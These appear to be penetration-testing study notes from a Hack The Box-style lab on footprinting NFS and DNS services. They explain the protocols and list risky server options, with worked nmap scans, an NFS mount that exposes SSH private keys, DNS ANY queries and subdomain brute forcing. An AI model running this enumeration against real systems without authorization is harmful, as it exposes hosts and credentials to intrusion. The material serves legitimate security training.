&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Network File System&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFS&lt;/code&gt;) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. &lt;a href=&quot;https://en.wikipedia.org/wiki/Network_File_System&quot;&gt;NFS&lt;/a&gt; is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFSv3&lt;/code&gt;), which has been in use for many years, authenticates the client computer, this changes with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFSv4&lt;/code&gt;. Here, as with the Windows SMB protocol, the user must authenticate.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Version&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Features&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFSv2&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;It is older but is supported by many systems and was initially operated entirely over UDP.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFSv3&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFSv4&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;NFS version 4.1 (&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc8881&quot;&gt;RFC 8881&lt;/a&gt;) aims to provide protocol support to leverage cluster server deployments, including the ability to provide scalable parallel access to files distributed across multiple servers (pNFS extension). In addition, NFSv4.1 includes a session trunking mechanism, also known as NFS multipathing. A significant advantage of NFSv4 over its predecessors is that only one UDP or TCP port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2049&lt;/code&gt; is used to run the service, which simplifies the use of the protocol across firewalls.&lt;/p&gt;

&lt;p&gt;NFS is based on the &lt;a href=&quot;https://en.wikipedia.org/wiki/Sun_RPC&quot;&gt;Open Network Computing Remote Procedure Call&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ONC-RPC&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUN-RPC&lt;/code&gt;) protocol exposed on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt; ports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111&lt;/code&gt;, which uses &lt;a href=&quot;https://en.wikipedia.org/wiki/External_Data_Representation&quot;&gt;External Data Representation&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XDR&lt;/code&gt;) for the system-independent exchange of data. The NFS protocol has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no&lt;/code&gt; mechanism for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authentication&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorization&lt;/code&gt;. Instead, authentication is completely shifted to the RPC protocol’s options. The authorization is derived from the available file system information. In this process, the server is responsible for translating the client’s user information into the file system’s format and converting the corresponding authorization details into the required UNIX syntax as accurately as possible.&lt;/p&gt;

&lt;p&gt;The most common authentication is via UNIX &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UID&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GID&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;group memberships&lt;/code&gt;, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the client and server do not necessarily have to have the same mappings of UID/GID to users and groups, and the server does not need to do anything further. No further checks can be made on the part of the server. This is why NFS should only be used with this authentication method in trusted networks.&lt;/p&gt;

&lt;h2 id=&quot;dangerous-settings-1&quot;&gt;Dangerous Settings&lt;/h2&gt;

&lt;p&gt;However, even with NFS, some settings can be dangerous for the company and its infrastructure. Here are some of them listed:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Option&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rw&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Read and write permissions.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;insecure&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Ports above 1024 will be used.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nohide&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;If another file system was mounted below an exported directory, this directory is exported by its own exports entry.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no_root_squash&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;All files created by root are kept with the UID/GID 0.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;It is highly recommended to create a local VM and experiment with the settings. We will discover methods that will show us how the NFS server is configured. For this, we can create several folders and assign different options to each one. Then we can inspect them and see what settings can have what effect on the NFS share and its permissions and the enumeration process.&lt;/p&gt;

&lt;p&gt;We can take a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;insecure&lt;/code&gt; option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.&lt;/p&gt;

&lt;p&gt;Footprint:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap 10.129.14.128 &lt;span class=&quot;nt&quot;&gt;-p111&lt;/span&gt;,2049 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt;

Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-19 17:12 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.14.128
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00018s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100227)&lt;/span&gt;
MAC Address: 00:00:00:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;6.58 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;mounting-nfs&quot;&gt;Mounting nfs&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nfs 10.129.14.128:/ /mnt &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; nolock
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;target-NFS
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tree &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;dns&quot;&gt;DNS&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Name System&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS&lt;/code&gt;) is an integral part of the Internet. For example, through domain names, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lol.example.com&lt;/code&gt; or &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.example.com&lt;/code&gt;&lt;/strong&gt;, we can reach the web servers that the hosting provider has assigned one or more specific IP addresses. DNS is a system for resolving computer names into IP addresses, and it does not have a central database. Simplified, we can imagine it like a library with many different phone books. The information is distributed over many thousands of name servers. Globally distributed DNS servers translate domain names into IP addresses and thus control which server a user can reach via a particular domain. There are several types of DNS servers that are used worldwide:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DNS root server&lt;/li&gt;
  &lt;li&gt;Authoritative name server&lt;/li&gt;
  &lt;li&gt;Non-authoritative name server&lt;/li&gt;
  &lt;li&gt;Caching server&lt;/li&gt;
  &lt;li&gt;Forwarding server&lt;/li&gt;
  &lt;li&gt;Resolver&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Server Type&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS Root Server&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The root servers of the DNS are responsible for the top-level domains (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLD&lt;/code&gt;). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The &lt;a href=&quot;https://www.icann.org/&quot;&gt;Internet Corporation for Assigned Names and Numbers&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ICANN&lt;/code&gt;) coordinates the work of the root name servers. There are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;13&lt;/code&gt; such root servers around the globe.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authoritative Nameserver&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client’s query, the root name server takes over at that point.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Non-authoritative Nameserver&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Caching DNS Server&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Forwarding Server&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Forwarding servers perform only one function: they forward DNS queries to another DNS server.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Resolver&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;DNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS over TLS&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DoT&lt;/code&gt;) or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS over HTTPS&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DoH&lt;/code&gt;) here. In addition, the network protocol &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNSCrypt&lt;/code&gt; also encrypts the traffic between the computer and the name server.&lt;/p&gt;

&lt;p&gt;However, the DNS does not only link computer names and IP addresses. It also stores and outputs additional information about the services associated with a domain. A DNS query can therefore also be used, for example, to determine which computer serves as the e-mail server for the domain in question or what the domain’s name servers are called.&lt;/p&gt;

&lt;p&gt;Different &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS records&lt;/code&gt; are used for the DNS queries, which all have various tasks. Moreover, separate entries exist for different functions since we can set up mail servers and other servers for a domain.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;DNS Record&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Returns an IPv4 address of the requested domain as a result.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AAAA&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Returns an IPv6 address of the requested domain.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MX&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Returns the responsible mail servers as a result.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NS&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Returns the DNS servers (nameservers) of the domain.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TXT&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CNAME&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;This record serves as an alias for another domain name. If you want the domain www.hackthebox.eu to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for www.hackthebox.eu.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PTR&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOA&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Provides information about the corresponding DNS zone and email address of the administrative contact.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOA&lt;/code&gt; record is located in a domain’s zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig soa www.inlanefreight.com

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.16.27-Debian &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; soa www.inlanefreight.com
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Got answer:
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: QUERY, status: NOERROR, id: 15876
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.inlanefreight.com.         IN      SOA

;; AUTHORITY SECTION:
inlanefreight.com.      900     IN      SOA     ns-161.awsdns-20.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400

;; Query time: 16 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Thu Jan 05 12:56:10 GMT 2023
;; MSG SIZE  rcvd: 128
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The dot (.) is replaced by an at sign (@) in the email address. In this example, the email address of the administrator is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awsdns-hostmaster@amazon.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For the IP address to be resolved from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fully Qualified Domain Name&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FQDN&lt;/code&gt;), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PTR&lt;/code&gt; record. The &lt;strong&gt;PTR&lt;/strong&gt; records are responsible for the reverse translation of IP addresses into names, as we have already seen in the above table.&lt;/p&gt;

&lt;p&gt;dangerous settings&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Option&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allow-query&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Defines which hosts are allowed to send requests to the DNS server.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allow-recursion&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Defines which hosts are allowed to send recursive requests to the DNS server.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allow-transfer&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Defines which hosts are allowed to receive zone transfers from the DNS server.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zone-statistics&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Collects statistical data of zones.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;![[dns_resolver.png]]&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig any inlanefreight.htb @10.129.14.128

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.16.1-Ubuntu &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; any inlanefreight.htb @10.129.14.128
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Got answer:
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: QUERY, status: NOERROR, id: 7649
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 064b7e1f091b95120100000061476865a6026d01f87d10ca (good)
;; QUESTION SECTION:
;inlanefreight.htb.             IN      ANY

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      TXT     &quot;v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all&quot;
inlanefreight.htb.      604800  IN      TXT     &quot;atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU&quot;
inlanefreight.htb.      604800  IN      TXT     &quot;MS=ms97310371&quot;
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136

;; Query time: 0 msec
;; SERVER: 10.129.14.128#53(10.129.14.128)
;; WHEN: So Sep 19 18:42:13 CEST 2021
;; MSG SIZE  rcvd: 437
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;subdomain-brute-forcing&quot;&gt;Subdomain Brute Forcing&lt;/h4&gt;

&lt;p&gt;DNS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;sub &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;dig &lt;span class=&quot;nv&quot;&gt;$sub&lt;/span&gt;.inlanefreight.htb @10.129.14.128 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;;\|SOA&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/^\s*$/d&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sub&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tee&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; subdomains.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Many different tools can be used for this, and most of them work in the same way. One of these tools is, for example &lt;a href=&quot;https://github.com/fwaeytens/dnsenum&quot;&gt;DNSenum&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;DNS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dnsenum &lt;span class=&quot;nt&quot;&gt;--dnsserver&lt;/span&gt; 10.129.14.128 &lt;span class=&quot;nt&quot;&gt;--enum&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; subdomains.txt &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb

dnsenum VERSION:1.2.6

&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;   inlanefreight.htb   &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;


Host&lt;span class=&quot;s1&quot;&gt;&apos;s addresses:
__________________



Name Servers:
______________

ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

